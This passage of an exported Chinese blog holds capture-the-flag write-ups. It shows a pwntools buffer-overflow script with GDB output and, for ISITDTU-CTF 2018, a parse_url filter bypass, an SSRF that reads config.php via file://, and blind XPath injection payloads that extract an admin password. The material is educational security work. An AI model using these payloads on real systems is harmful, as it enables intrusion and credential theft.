PTR [rsp+0x8]</span><br><span class=\"line\">=&gt; 0x7ffff7a332f6 &lt;do_system+1094&gt;:\tmovaps XMMWORD PTR [rsp+0x40],xmm0</span><br><span class=\"line\">   0x7ffff7a332fb &lt;do_system+1099&gt;:\tcall   0x7ffff7a23110 &lt;__GI___sigaction&gt;</span><br><span class=\"line\">   0x7ffff7a33300 &lt;do_system+1104&gt;:\tlea    rsi,[rip+0x39e2f9]        # 0x7ffff7dd1600 &lt;quit&gt;</span><br><span class=\"line\">   0x7ffff7a33307 &lt;do_system+1111&gt;:\txor    edx,edx</span><br><span class=\"line\">   0x7ffff7a33309 &lt;do_system+1113&gt;:\tmov    edi,0x3</span><br><span class=\"line\">[------------------------------------stack-------------------------------------]</span><br><span class=\"line\">0000| 0x7fffffffdbf8 --&gt; 0x7fffffffdc80 --&gt; 0x0 </span><br><span class=\"line\">0008| 0x7fffffffdc00 --&gt; 0x7ffff7b97e97 --&gt; 0x2f6e69622f00632d (&apos;-c&apos;)</span><br><span class=\"line\">0016| 0x7fffffffdc08 --&gt; 0x0 </span><br><span class=\"line\">0024| 0x7fffffffdc10 --&gt; 0x0 </span><br><span class=\"line\">0032| 0x7fffffffdc18 --&gt; 0x7ffff7a33360 (&lt;cancel_handler&gt;:\tpush   rbx)</span><br><span class=\"line\">0040| 0x7fffffffdc20 --&gt; 0x7fffffffdc14 --&gt; 0xf7a3336000000000 </span><br><span class=\"line\">0048| 0x7fffffffdc28 --&gt; 0x0 </span><br><span class=\"line\">0056| 0x7fffffffdc30 --&gt; 0x0 </span><br><span class=\"line\">[------------------------------------------------------------------------------]</span><br><span class=\"line\">Legend: code, data, rodata, value</span><br><span class=\"line\">Stopped reason: SIGSEGV</span><br><span class=\"line\">0x00007ffff7a332f6 in do_system (line=0x4006c4 &quot;/bin/sh&quot;) at ../sysdeps/posix/system.c:125</span><br><span class=\"line\">125\t../sysdeps/posix/system.c: No such file or directory.</span><br></pre></td></tr></table></figure>\n<p>卡在这个地方:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0x7ffff7a332f6 &lt;do_system+1094&gt;:\tmovaps XMMWORD PTR [rsp+0x40],xmm0</span><br></pre></td></tr></table></figure>\n<p>这是因为movaps需要我们的rsp地址对齐到16字节。</p>\n<p>当前rsp的值:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">RSP: 0x7fffffffdbf8</span><br></pre></td></tr></table></figure>\n<p>知道原因后，我们可以重新构造如下payload:</p>\n<blockquote>\n<p>‘A’ * 280 + ret_addr + shell_addr</p>\n</blockquote>\n<p>脚本如下:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 'A' * 280 + ret_addr + shell_addr</span></span><br><span class=\"line\">payload = <span class=\"string\">'A'</span> * <span class=\"number\">280</span> + <span class=\"string\">'\\x38\\x06\\x40\\x00\\x00\\x00\\x00\\x00'</span> + <span class=\"string\">'\\xc7\\x05\\x40\\x00\\x00\\x00\\x00\\x00'</span></span><br><span class=\"line\"></span><br><span class=\"line\">io = process(<span class=\"string\">\"./vuln\"</span>)</span><br><span class=\"line\">io.sendline(payload)</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>"},{"title":"ISITDTU-CTF","date":"2018-07-30T03:37:21.000Z","_content":"\n## Web\n\n### lz\n\n代码审计\n\n```php\n<?php \n\ninclude \"config.php\"; \n$number1 = rand(1,100000000000000); \n$number2 = rand(1,100000000000); \n$number3 = rand(1,100000000); \n$url = urldecode($_SERVER['REQUEST_URI']); \n$url = parse_url($url, PHP_URL_QUERY); \nif (preg_match(\"/_/i\", $url))  \n{ \n    die(\"...\"); \n} \nif (preg_match(\"/0/i\", $url))  \n{ \n    die(\"...\"); \n} \nif (preg_match(\"/\\w+/i\", $url))  \n{ \n    die(\"...\"); \n}     \nif(isset($_GET['_']) && !empty($_GET['_'])) \n{ \n    $control = $_GET['_'];         \n    if(!in_array($control, array(0,$number1))) \n    { \n        die(\"fail1\"); \n    } \n    if(!in_array($control, array(0,$number2))) \n    { \n        die(\"fail2\"); \n    } \n    if(!in_array($control, array(0,$number3))) \n    { \n        die(\"fail3\"); \n    } \n    echo $flag; \n} \nshow_source(__FILE__); \n```\n\n```\n$url = urldecode($_SERVER['REQUEST_URI']); \n$url = parse_url($url, PHP_URL_QUERY);\n```\n\n由于这里在进行parse_url操作之前，先进行了一次`urldecode`操作，所以可以编码*#* 从而绕过parse_url检测。\n\npayload:\n\n```\nhttp://35.185.178.212/?%23&_=a\n\nphp > var_dump(parse_url(urldecode(\"%23&_=a\")),PHP_URL_QUERY);\narray(1) {                                                    \n  [\"fragment\"]=>                                              \n  string(4) \"&_=a\"                                            \n}                                                             \nint(6)\n```\n\n在特定情况下也可以使用如下payload:\n\n```\nhttp://35.185.178.212///?_=a\n```\n\n测试如下:\n\n```\nphp > var_dump(parse_url(urldecode(\"//?_=a\")),PHP_URL_QUERY);\nbool(false)\nint(6)\nphp > var_dump(parse_url(urldecode(\"//a?_=a\")),PHP_URL_QUERY);\narray(2) {\n  [\"host\"]=>\n  string(1) \"a\"\n  [\"query\"]=>\n  string(3) \"_=a\"\n}\nint(6)\nphp > var_dump(parse_url(urldecode(\"//a/?_=a\")),PHP_URL_QUERY);\narray(3) {\n  [\"host\"]=>\n  string(1) \"a\"\n  [\"path\"]=>\n  string(1) \"/\"\n  [\"query\"]=>\n  string(3) \"_=a\"\n}\nint(6)\n```\n\n### Friss\n\n获取index.php\n\n> curl http://35.190.142.60/index.php?debug=1\n\nindex.php\n\n```php\n<?php \ninclude_once \"config.php\"; \nif (isset($_POST['url'])&&!empty($_POST['url'])) \n{ \n    $url = $_POST['url']; \n    $content_url = getUrlContent($url); \n} \nelse \n{ \n    $content_url = \"\"; \n} \nif(isset($_GET['debug'])) \n{ \n    show_source(__FILE__); \n} \n\n\n?> \n\n<form action=\"index.php\" method=\"POST\"> \n<input name=\"url\" type=\"text\"> \n<input type=\"submit\" value=\"CURL\"> \n</form> \n\n\n<?php  \n\necho $content_url; \n?> \n```\n\n获取config.php\n\n> curl --data \"url=file://localhost/var/www/html/config.php\" http://35.190.142.60/index.php\n\nconfig.php\n\n```php\n<?php\n\n\n$hosts = \"localhost\";\n$dbusername = \"ssrf_user\";\n$dbpasswd = \"\";\n$dbname = \"ssrf\";\n$dbport = 3306;\n\n$conn = mysqli_connect($hosts,$dbusername,$dbpasswd,$dbname,$dbport);\n\nfunction initdb($conn)\n{\n        $dbinit = \"create table if not exists flag(secret varchar(100));\";\n        if(mysqli_query($conn,$dbinit)) return 1;\n        else return 0;\n}\n\nfunction safe($url)\n{\n        $tmpurl = parse_url($url, PHP_URL_HOST);\n        if($tmpurl != \"localhost\" and $tmpurl != \"127.0.0.1\")\n        {\n                var_dump($tmpurl);\n                die(\"<h1>Only access to localhost</h1>\");\n        }\n        return $url;\n}\n\nfunction getUrlContent($url){\n        $url = safe($url);\n        $url = escapeshellarg($url);\n        $pl = \"curl \".$url;\n        echo $pl;\n        $content = shell_exec($pl);\n        return $content;\n}\ninitdb($conn);\n?>\n```\n\n登录数据库\n\n> mysql -h 127.0.0.1 -u ssrf_user \n\nssrf操作: 利用gopher协议查询数据库。\n\n### Access  Box\n\n要点：xpath注入。\n\n参考文章：https://www.cnblogs.com/bmjoker/p/8861927.html\n\n1. 提取父节点名字\n\n   ```\n   'or substring(name(parent::*[position()=1]),1,1)='a\n   ```\n\n    结果如下：\n\n   ![](/assets/isictf/TIM截图20180804151333.png)\n\n   可以发现第一个字母为`u`。最终，可以得到父节点名字为`user`。\n\n2. 探测子节点\n\n   探测第一个user节点下第二个字段的名字。\n\n   ```\n   'or substring(name(//user[1]/*[2]),1,1)='u' or 'a'='a\n   ```\n\n   ![](/assets/isictf/TIM截图20180804153803.png)\n\n3. 探测子节点的值\n\n   探测第一个user节点下第1个字段的值\n\n   ```\n   'or substring(//user[1]/*[2],1,1)='u' or 'a'='a\n   或者:\n   'or substring(//user[1]/*[1]/text(),1,1)='F&password=1\n   ```\n\n   结果:\n\n   ![](/assets/isictf/TIM截图20180804153002.png)\n\n   最终得到账号：\n\n   ```\n   Adm1n\n   Ez_t0_gu3ss_PaSSw0rd\n   ```\n\n## pwn\n\nhttps://github.com/chung96vn/challenges","source":"_posts/ISITDTU-CTF.md","raw":"---\ntitle: ISITDTU-CTF\ndate: 2018-07-30 11:37:21\ntags: ctf\n---\n\n## Web\n\n### lz\n\n代码审计\n\n```php\n<?php \n\ninclude \"config.php\"; \n$number1 = rand(1,100000000000000); \n$number2 = rand(1,100000000000); \n$number3 = rand(1,100000000); \n$url = urldecode($_SERVER['REQUEST_URI']); \n$url = parse_url($url, PHP_URL_QUERY); \nif (preg_match(\"/_/i\", $url))  \n{ \n    die(\"...\"); \n} \nif (preg_match(\"/0/i\", $url))  \n{ \n    die(\"...\"); \n} \nif (preg_match(\"/\\w+/i\", $url))  \n{ \n    die(\"...\"); \n}     \nif(isset($_GET['_']) && !empty($_GET['_'])) \n{ \n    $control = $_GET['_'];         \n    if(!in_array($control, array(0,$number1))) \n    { \n        die(\"fail1\"); \n    } \n    if(!in_array($control, array(0,$number2))) \n    { \n        die(\"fail2\"); \n    } \n    if(!in_array($control, array(0,$number3))) \n    { \n        die(\"fail3\"); \n    } \n    echo $flag; \n} \nshow_source(__FILE__); \n```\n\n```\n$url = urldecode($_SERVER['REQUEST_URI']); \n$url = parse_url($url, PHP_URL_QUERY);\n```\n\n由于这里在进行parse_url操作之前，先进行了一次`urldecode`操作，所以可以编码*#* 从而绕过parse_url检测。\n\npayload:\n\n```\nhttp://35.185.178.212/?%23&_=a\n\nphp > var_dump(parse_url(urldecode(\"%23&_=a\")),PHP_URL_QUERY);\narray(1) {                                                    \n  [\"fragment\"]=>                                              \n  string(4) \"&_=a\"                                            \n}                                                             \nint(6)\n```\n\n在特定情况下也可以使用如下payload:\n\n```\nhttp://35.185.178.212///?_=a\n```\n\n测试如下:\n\n```\nphp > var_dump(parse_url(urldecode(\"//?_=a\")),PHP_URL_QUERY);\nbool(false)\nint(6)\nphp > var_dump(parse_url(urldecode(\"//a?_=a\")),PHP_URL_QUERY);\narray(2) {\n  [\"host\"]=>\n  string(1) \"a\"\n  [\"query\"]=>\n  string(3) \"_=a\"\n}\nint(6)\nphp > var_dump(parse_url(urldecode(\"//a/?_=a\")),PHP_URL_QUERY);\narray(3) {\n  [\"host\"]=>\n  string(1) \"a\"\n  [\"path\"]=>\n  string(1) \"/\"\n  [\"query\"]=>\n  string(3) \"_=a\"\n}\nint(6)\n```\n\n### Friss\n\n获取index.php\n\n> curl http://35.190.142.60/index.php?debug=1\n\nindex.php\n\n```php\n<?php \ninclude_once \"config.php\"; \nif (isset($_POST['url'])&&!empty($_POST['url'])) \n{ \n    $url = $_POST['url']; \n    $content_url = getUrlContent($url); \n} \nelse \n{ \n    $content_url = \"\"; \n} \nif(isset($_GET['debug'])) \n{ \n    show_source(__FILE__); \n} \n\n\n?> \n\n<form action=\"index.php\" method=\"POST\"> \n<input name=\"url\" type=\"text\"> \n<input type=\"submit\" value=\"CURL\"> \n</form> \n\n\n<?php  \n\necho $content_url; \n?> \n```\n\n获取config.php\n\n> curl --data \"url=file://localhost/var/www/html/config.php\" http://35.190.142.60/index.php\n\nconfig.php\n\n```php\n<?php\n\n\n$hosts = \"localhost\";\n$dbusername = \"ssrf_user\";\n$dbpasswd = \"\";\n$dbname = \"ssrf\";\n$dbport = 3306;\n\n$conn = mysqli_connect($hosts,$dbusername,$dbpasswd,$dbname,$dbport);\n\nfunction initdb($conn)\n{\n        $dbinit = \"create table if not exists flag(secret varchar(100));\";\n        if(mysqli_query($conn,$dbinit)) return 1;\n        else return 0;\n}\n\nfunction safe($url)\n{\n        $tmpurl = parse_url($url, PHP_URL_HOST);\n        if($tmpurl != \"localhost\" and $tmpurl != \"127.0.0.1\")\n        {\n                var_dump($tmpurl);\n                die(\"<h1>Only access to localhost</h1>\");\n        }\n        return $url;\n}\n\nfunction getUrlContent($url){\n        $url = safe($url);\n        $url = escapeshellarg($url);\n        $pl = \"curl \".$url;\n        echo $pl;\n        $content = shell_exec($pl);\n        return $content;\n}\ninitdb($conn);\n?>\n```\n\n登录数据库\n\n> mysql -h 127.0.0.1 -u ssrf_user \n\nssrf操作: 利用gopher协议查询数据库。\n\n### Access  Box\n\n要点：xpath注入。\n\n参考文章：https://www.cnblogs.com/bmjoker/p/8861927.html\n\n1. 提取父节点名字\n\n   ```\n   'or substring(name(parent::*[position()=1]),1,1)='a\n   ```\n\n    结果如下：\n\n   ![](/assets/isictf/TIM截图20180804151333.png)\n\n   可以发现第一个字母为`u`。最终，可以得到父节点名字为`user`。\n\n2. 探测子节点\n\n   探测第一个user节点下第二个字段的名字。\n\n   ```\n   'or substring(name(//user[1]/*[2]),1,1)='u' or 'a'='a\n   ```\n\n   ![](/assets/isictf/TIM截图20180804153803.png)\n\n3. 探测子节点的值\n\n   探测第一个user节点下第1个字段的值\n\n   ```\n   'or substring(//user[1]/*[2],1,1)='u' or 'a'='a\n   或者:\n   'or substring(//user[1]/*[1]/text(),1,1)='F&password=1\n   ```\n\n   结果:\n\n   ![](/assets/isictf/TIM截图20180804153002.png)\n\n   最终得到账号：\n\n   ```\n   Adm1n\n   Ez_t0_gu3ss_PaSSw0rd\n   ```\n\n## pwn\n\nhttps://github.com/chung96vn/challenges","slug":"ISITDTU-CTF","published":1,"updated":"2018-08-06T12:29:24.133Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjkia12gi0003qkdlmvzhes3z","content":"<h2 id=\"Web\"><a href=\"#Web\" class=\"headerlink\" title=\"Web\"></a>Web</h2><h3 id=\"lz\"><a href=\"#lz\" class=\"headerlink\" title=\"lz\"></a>lz</h3><p>代码审计</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">\"config.php\"</span>; </span><br><span class=\"line\">$number1 = rand(<span class=\"number\">1</span>,<span class=\"number\">100000000000000</span>); </span><br><span class=\"line\">$number2 = rand(<span class=\"number\">1</span>,<span class=\"number\">100000000000</span>); </span><br><span class=\"line\">$number3 = rand(<span class=\"number\">1</span>,<span class=\"number\">100000000</span>); </span><br><span class=\"line\">$url = urldecode($_SERVER[<span class=\"string\">'REQUEST_URI'</span>]); </span><br><span class=\"line\">$url = parse_url($url, PHP_URL_QUERY); </span><br><span class=\"line\"><span class=\"keyword\">if</span> (preg_match(<span class=\"string\">\"/_/i\"</span>, $url))  </span><br><span class=\"line\">&#123; </span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">\"...\"</span>); </span><br><span class=\"line\">&#125; </span><br><span class=\"line\"><span class=\"keyword\">if</span> (preg_match(<span class=\"string\">\"/0/i\"</span>, $url))  </span><br><span class=\"line\">&#123; </span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">\"...\"</span>); </span><br><span class=\"line\">&#125; </span><br><span class=\"line\"><span class=\"keyword\">if</span> (preg_match(<span class=\"string\">\"/\\w+/i\"</span>, $url))  </span><br><span class=\"line\">&#123; </span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">\"...\"</span>); </span><br><span class=\"line\">&#125;     </span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'_'</span>]) &amp;&amp; !<span class=\"keyword\">empty</span>($_GET[<span class=\"string\">'_'</span>])) </span><br><span class=\"line\">&#123; </span><br><span class=\"line\">    $control = $_GET[<span class=\"string\">'_'</span>];         </span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!in_array($control, <span class=\"keyword\">array</span>(<span class=\"number\">0</span>,$number1))) </span><br><span class=\"line\">    &#123; </span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">\"fail1\"</span>); </span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!in_array($control, <span class=\"keyword\">array</span>(<span class=\"number\">0</span>,$number2))) </span><br><span class=\"line\">    &#123; </span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">\"fail2\"</span>); </span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!in_array($control, <span class=\"keyword\">array</span>(<span class=\"number\">0</span>,$number3))) </span><br><span class=\"line\">    &#123; </span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">\"fail3\"</span>); </span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">    <span class=\"keyword\">echo</span> $flag; </span><br><span class=\"line\">&#125; </span><br><span class=\"line\">show_source(<span class=\"keyword\">__FILE__</span>);</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$url = urldecode($_SERVER[&apos;REQUEST_URI&apos;]); </span><br><span class=\"line\">$url = parse_url($url, PHP_URL_QUERY);</span><br></pre></td></tr></table></figure>\n<p>由于这里在进行parse_url操作之前，先进行了一次<code>urldecode</code>操作，所以可以编码<em>#</em> 从而绕过parse_url检测。</p>\n<p>payload:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://35.185.178.212/?%23&amp;_=a</span><br><span class=\"line\"></span><br><span class=\"line\">php &gt; var_dump(parse_url(urldecode(&quot;%23&amp;_=a&quot;)),PHP_URL_QUERY);</span><br><span class=\"line\">array(1) &#123;                                                    </span><br><span class=\"line\">  [&quot;fragment&quot;]=&gt;                                              </span><br><span class=\"line\">  string(4) &quot;&amp;_=a&quot;                                            </span><br><span class=\"line\">&#125;                                                             </span><br><span class=\"line\">int(6)</span><br></pre></td></tr></table></figure>\n<p>在特定情况下也可以使用如下payload:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://35.185.178.212///?_=a</span><br></pre></td></tr></table></figure>\n<p>测试如下:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">php &gt; var_dump(parse_url(urldecode(&quot;//?_=a&quot;)),PHP_URL_QUERY);</span><br><span class=\"line\">bool(false)</span><br><span class=\"line\">int(6)</span><br><span class=\"line\">php &gt; var_dump(parse_url(urldecode(&quot;//a?_=a&quot;)),PHP_URL_QUERY);</span><br><span class=\"line\">array(2) &#123;</span><br><span class=\"line\">  [&quot;host&quot;]=&gt;</span><br><span class=\"line\">  string(1) &quot;a&quot;</span><br><span class=\"line\">  [&quot;query&quot;]=&gt;</span><br><span class=\"line\">  string(3) &quot;_=a&quot;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">int(6)</span><br><span class=\"line\">php &gt; var_dump(parse_url(urldecode(&quot;//a/?_=a&quot;)),PHP_URL_QUERY);</span><br><span class=\"line\">array(3) &#123;</span><br><span class=\"line\">  [&quot;host&quot;]=&gt;</span><br><span class=\"line\">  string(1) &quot;a&quot;</span><br><span class=\"line\">  [&quot;path&quot;]=&gt;</span><br><span class=\"line\">  string(1) &quot;/&quot;</span><br><span class=\"line\">  [&quot;query&quot;]=&gt;</span><br><span class=\"line\">  string(3) &quot;_=a&quot;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">int(6)</span><br></pre></td></tr></table></figure>\n<h3 id=\"Friss\"><a href=\"#Friss\" class=\"headerlink\" title=\"Friss\"></a>Friss</h3><p>获取index.php</p>\n<blockquote>\n<p>curl <a href=\"http://35.190.142.60/index.php?debug=1\" target=\"_blank\" rel=\"noopener\">http://35.190.142.60/index.php?debug=1</a></p>\n</blockquote>\n<p>index.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\"><span class=\"keyword\">include_once</span> <span class=\"string\">\"config.php\"</span>; </span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($_POST[<span class=\"string\">'url'</span>])&amp;&amp;!<span class=\"keyword\">empty</span>($_POST[<span class=\"string\">'url'</span>])) </span><br><span class=\"line\">&#123; </span><br><span class=\"line\">    $url = $_POST[<span class=\"string\">'url'</span>]; </span><br><span class=\"line\">    $content_url = getUrlContent($url); </span><br><span class=\"line\">&#125; </span><br><span class=\"line\"><span class=\"keyword\">else</span> </span><br><span class=\"line\">&#123; </span><br><span class=\"line\">    $content_url = <span class=\"string\">\"\"</span>; </span><br><span class=\"line\">&#125; </span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'debug'</span>])) </span><br><span class=\"line\">&#123; </span><br><span class=\"line\">    show_source(<span class=\"keyword\">__FILE__</span>); </span><br><span class=\"line\">&#125; </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span> </span><br><span class=\"line\"></span><br><span class=\"line\">&lt;form action=<span class=\"string\">\"index.php\"</span> method=<span class=\"string\">\"POST\"</span>&gt; </span><br><span class=\"line\">&lt;input name=<span class=\"string\">\"url\"</span> type=<span class=\"string\">\"text\"</span>&gt; </span><br><span class=\"line\">&lt;input type=<span class=\"string\">\"submit\"</span> value=<span class=\"string\">\"CURL\"</span>&gt; </span><br><span class=\"line\">&lt;/form&gt; </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span>  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">echo</span> $content_url; </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>获取config.php</p>\n<blockquote>\n<p>curl –data “url=file://localhost/var/www/html/config.php” <a href=\"http://35.190.142.60/index.php\" target=\"_blank\" rel=\"noopener\">http://35.190.142.60/index.php</a></p>\n</blockquote>\n<p>config.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">$hosts = <span class=\"string\">\"localhost\"</span>;</span><br><span class=\"line\">$dbusername = <span class=\"string\">\"ssrf_user\"</span>;</span><br><span class=\"line\">$dbpasswd = <span class=\"string\">\"\"</span>;</span><br><span class=\"line\">$dbname = <span class=\"string\">\"ssrf\"</span>;</span><br><span class=\"line\">$dbport = <span class=\"number\">3306</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">$conn = mysqli_connect($hosts,$dbusername,$dbpasswd,$dbname,$dbport);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">initdb</span><span class=\"params\">($conn)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">        $dbinit = <span class=\"string\">\"create table if not exists flag(secret varchar(100));\"</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(mysqli_query($conn,$dbinit)) <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">        <span class=\"keyword\">else</span> <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">safe</span><span class=\"params\">($url)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">        $tmpurl = parse_url($url, PHP_URL_HOST);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>($tmpurl != <span class=\"string\">\"localhost\"</span> <span class=\"keyword\">and</span> $tmpurl != <span class=\"string\">\"127.0.0.1\"</span>)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">                var_dump($tmpurl);</span><br><span class=\"line\">                <span class=\"keyword\">die</span>(<span class=\"string\">\"&lt;h1&gt;Only access to localhost&lt;/h1&gt;\"</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> $url;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getUrlContent</span><span class=\"params\">($url)</span></span>&#123;</span><br><span class=\"line\">        $url = safe($url);</span><br><span class=\"line\">        $url = escapeshellarg($url);</span><br><span class=\"line\">        $pl = <span class=\"string\">\"curl \"</span>.$url;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> $pl;</span><br><span class=\"line\">        $content = shell_exec($pl);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> $content;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">initdb($conn);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>登录数据库</p>\n<blockquote>\n<p>mysql -h 127.0.0.1 -u ssrf_user </p>\n</blockquote>\n<p>ssrf操作: 利用gopher协议查询数据库。</p>\n<h3 id=\"Access-Box\"><a href=\"#Access-Box\" class=\"headerlink\" title=\"Access  